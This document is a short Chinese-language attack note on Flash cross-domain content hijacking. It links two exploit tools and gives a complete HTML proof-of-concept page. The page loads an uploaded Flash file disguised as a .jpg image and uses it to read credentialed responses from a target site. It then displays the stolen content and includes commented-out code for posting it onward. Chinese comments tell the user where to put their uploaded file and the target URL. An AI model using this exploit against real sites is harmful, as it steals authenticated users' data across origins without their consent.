## flash跨域劫持
[CrossSiteContentHijacking](https://github.com/nccgroup/CrossSiteContentHijacking)
[flash-xdomain-xploit](https://github.com/gursev/flash-xdomain-xploit)
```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gbk"/>
<title>csrftest</title>
<script>
function Connection(Sendtype,url,content,callback){
    if (window.XMLHttpRequest){
        var xmlhttp=new XMLHttpRequest();
    }
    else{
        var xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    } 
    xmlhttp.onreadystatechange=function(){
        if(xmlhttp.readyState==4&&xmlhttp.status==200)
        {
            callback(xmlhttp.responseText);
        }
    }
    xmlhttp.open(Sendtype,url,true);
    xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    xmlhttp.withCredentials = "true";
    xmlhttp.send(content);
}
function sendToJavaScript(strData){
    var theDiv = document.getElementById("HijackedData");
    var content = document.createTextNode(strData);
    theDiv.appendChild(content);
    theDiv.innerHTML += '<br/>'
    //var posturl = "";   //如果是post，请去掉这三行的注释
    //var postdata= "";    
    //Connection("POST",posturl,postdata,function(callback){});
}
</script>
</head>
<body>

<div id=HijackedData></div>
<object id="myObject" width="100" height="100" allowscriptaccess="always" type="application/x-shockwave-flash" data="http://127.0.0.1/upload/2015.jpg">   //你上传的图片后缀的flash
<param name="AllowScriptAccess" value="always">
<param name="flashvars" value="input=http://127.0.0.1">  //你要请求的地址
</object>

</body>
</html> 
```